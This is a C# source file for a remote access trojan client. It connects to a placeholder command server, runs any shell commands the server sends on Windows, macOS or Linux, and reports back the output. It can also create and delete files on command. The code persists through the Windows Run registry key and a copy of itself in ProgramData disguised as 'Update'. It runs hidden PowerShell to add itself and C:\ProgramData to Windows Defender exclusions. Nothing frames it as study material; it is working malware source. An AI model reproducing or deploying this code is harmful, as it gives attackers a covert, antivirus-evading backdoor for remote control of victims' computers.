﻿using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;

namespace Client
{
    class Program
    {
        private static TcpClient client;
        private static string serverAddress = "%ADDRESS%";
        private static bool isInstall;
        private static int serverPort = 02220;
        private static Mutex appMutex;
        private static bool isConnected = false;
        private static System.Timers.Timer responseTimer;

        static void Main(string[] args)
        {
            if (!InitializeMutex())
            {
                Console.WriteLine("Another instance is already running.");
                return;
            }
            Install();
            Console.WriteLine("Client is starting...");
            AddCurrentExecutableToStartup();
            ConnectToServer();
            StartPingRoutine();
            AddWDExclusion();
            ReleaseMutexOnExit();
        }

        static bool InitializeMutex()
        {
            bool createdNew;
            string mutexId = $"Global\\{nameof(Client)}";
            appMutex = new Mutex(true, mutexId, out createdNew);
            return createdNew;
        }

        static void ReleaseMutexOnExit()
        {
            AppDomain.CurrentDomain.ProcessExit += (sender, e) =>
            {
                appMutex?.ReleaseMutex();
                appMutex?.Dispose();
            };
        }

        static void AddWDExclusion()
        {
            // Get the full path of the current executable
            string currentFile = Assembly.GetExecutingAssembly().Location;

            // PowerShell script to add the current file to Windows Defender exclusions
            string script = $"-w Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Add-MpPreference -ExclusionPath '{currentFile}'; Add-MpPreference -ExclusionPath 'C:\\ProgramData'\";";

            // Start a hidden PowerShell process to run the script
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = script,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            try
            {
                using (Process process = Process.Start(psi))
                {
                    process.WaitForExit(); // Wait for the process to complete
                    Console.WriteLine("Exclusion added successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to add exclusion: " + ex.Message);
            }
        }

        static void ConnectToServer()
        {
            while (!isConnected)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(serverAddress, serverPort);
                    isConnected = true;
                    Console.WriteLine("Connected to server.");
                    StartListening();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error connecting to server: " + ex.Message);
                    Thread.Sleep(3000);
                }
            }
        }

        static void StartPingRoutine()
        {
            new Thread(() =>
            {
                while (isConnected)
                {
                    try
                    {
                        SendData("ping");
                        SetupResponseTimer();
                        Thread.Sleep(3000);  // Wait before sending next ping
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Ping failed: " + ex.Message);
                        isConnected = false;
                        Thread.Sleep(3000);
                        ConnectToServer();
                    }
                }
            }).Start();
        }

        static void SetupResponseTimer()
        {
            responseTimer = new System.Timers.Timer(5000);  // Set timeout for 5 seconds
            responseTimer.Elapsed += OnResponseTimeout;
            responseTimer.AutoReset = false;  // Only trigger once unless reset
            responseTimer.Start();
        }

        static void OnResponseTimeout(Object source, System.Timers.ElapsedEventArgs e)
        {
            Console.WriteLine("No response from server. Attempting to reconnect...");
            isConnected = false;
            responseTimer.Stop();
            ConnectToServer();
        }

        static void StartListening()
        {
            new Thread(() =>
            {
                try
                {
                    NetworkStream stream = client.GetStream();
                    byte[] buffer = new byte[1024];

                    while (isConnected)
                    {
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                        if (command != "pong")
                        {
                            Console.WriteLine("Received command: " + command);
                        }
                        ExecuteCommand(command);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Lost connection to server. " + ex.Message);
                    isConnected = false;
                    client.Close();
                    ConnectToServer();
                }
            }).Start();
        }

        static void ExecuteCommand(string command)
        {
            string[] commandParts = command.Split(' ');
            string commandType = commandParts[0].ToLower();

            switch (commandType)
            {
                case "shell":
                    ExecuteShellCommand(command.Substring(6));
                    break;
                case "getsysinfo":
                    SendData(GetSystemInfo());
                    break;
                case "file":
                    HandleFileOperations(commandParts);
                    break;
                case "pong":
                    responseTimer.Stop();  // Stop the timer as pong is received
                    isConnected = true;
                    break;
                case "close":
                    Environment.Exit(0); // Normal closure
                    break;
                default:
                    SendData("Unknown command type.");
                    break;
            }
        }

        static void Install()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows) & isInstall)
            {
                // Define the path where you want to store the executable
                string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Update");

                // Ensure the directory exists
                if (!Directory.Exists(programDataPath))
                    Directory.CreateDirectory(programDataPath);

                // Get the current executable's path
                string currentExePath = Assembly.GetExecutingAssembly().Location;
                string exeName = Path.GetFileName(currentExePath);
                string targetExePath = Path.Combine(programDataPath, exeName);

                // Check if the current executable is already in the target path
                if (!currentExePath.Equals(targetExePath, StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        // Copy the executable to the ProgramData directory
                        File.Copy(currentExePath, targetExePath, true);

                        // Start the new executable
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = targetExePath,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });

                        // Exit the current process
                        Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Failed to copy and run from ProgramData: " + ex.Message);
                    }
                }
                else
                {
                    return;
                }
            }
            else { return; }
        }

        static void ExecuteShellCommand(string command)
        {
            // Determine the shell based on the operating system
            string shell;
            string shellArgs;
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                shell = "cmd.exe";
                shellArgs = $"/c {command}";
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                shell = "/bin/zsh";
                shellArgs = $"-c \"{command}\"";
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                shell = "/bin/bash";
                shellArgs = $"-c \"{command}\"";
            }
            else
            {
                throw new InvalidOperationException("Unsupported operating system.");
            }

            ProcessStartInfo startInfo = new ProcessStartInfo(shell, shellArgs)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process proc = Process.Start(startInfo))
            {
                string output = proc.StandardOutput.ReadToEnd();
                string errors = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                SendData($"Output: {output}\nErrors: {errors}");
            }
        }

        static void HandleFileOperations(string[] commandParts)
        {
            string operation = commandParts[1];
            string filePath = commandParts[2];

            switch (operation)
            {
                case "create":
                    File.Create(filePath).Dispose();
                    SendData($"File created: {filePath}");
                    break;
                case "delete":
                    File.Delete(filePath);
                    SendData($"File deleted: {filePath}");
                    break;
                default:
                    SendData("Unsupported file operation.");
                    break;
            }
        }

        static string GetSystemInfo()
        {
            return "System Info: CPU Usage, Memory Usage, etc.";
        }

        static void SendData(string data)
        {
            if (isConnected && client.Connected)
            {
                byte[] buffer = Encoding.UTF8.GetBytes(data);
                NetworkStream stream = client.GetStream();
                stream.Write(buffer, 0, buffer.Length);
                if (data != "ping")
                {
                    Console.WriteLine("Sent data to server: " + data);
                }
            }
            else
            {
                Console.WriteLine("Not connected to server.");
            }
        }

        static void AddCurrentExecutableToStartup()
        {
            try
            {
                string appName = "Update"; // Change this to your application's name
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location; // Gets the path of the currently running executable

                // Path to the key where Windows looks for startup applications
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

                if (key == null)
                {
                    Console.WriteLine("Failed to open registry key.");
                    return;
                }

                // Set the value in the registry
                key.SetValue(appName, $"\"{path}\"");

                Console.WriteLine($"{appName} has been added to startup.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to add to startup: {ex.Message}");
            }
        }

        static void ExecutePowerShellCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $@"-w Hidden -NoProfile -ExecutionPolicy Bypass -Command ""{command}""",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string errors = process.StandardError.ReadToEnd();
                process.WaitForExit();

                Console.WriteLine("Output: " + output);
                if (!string.IsNullOrEmpty(errors))
                {
                    Console.WriteLine("Errors: " + errors);
                }
            }
        }
    }
}
